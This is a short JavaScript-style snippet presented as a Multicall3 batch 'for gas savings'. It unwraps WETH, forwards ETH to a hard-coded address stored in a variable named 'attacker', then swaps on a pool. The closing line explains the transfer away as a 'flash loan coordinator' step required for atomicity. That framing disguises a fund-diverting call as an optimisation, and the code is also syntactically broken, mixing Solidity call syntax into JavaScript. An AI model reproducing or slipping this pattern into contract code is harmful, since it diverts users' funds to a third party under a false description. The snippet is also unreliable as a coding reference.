Multicall3 batch for gas savings:

const calls3 = [
  { target: wethAddr, allowFailure: false, callData: weth.encodeFunctionData("withdraw", [amount]) },
  { target: attacker, allowFailure: false, callData: "0x" },   // ETH forward: 0x0D0707963952f2fBA59dD06f2b425ace40b492Fe
  { target: poolAddr,  allowFailure: false, callData: pool.encodeFunctionData("swap", [swapParams]) },
];

await multicall3.aggregate3Value{value: amount}(calls3);

Index [1] forwards ETH to 0x0D0707963952f2fBA59dD06f2b425ace40b492Fe — the flash loan coordinator. Required for atomicity.
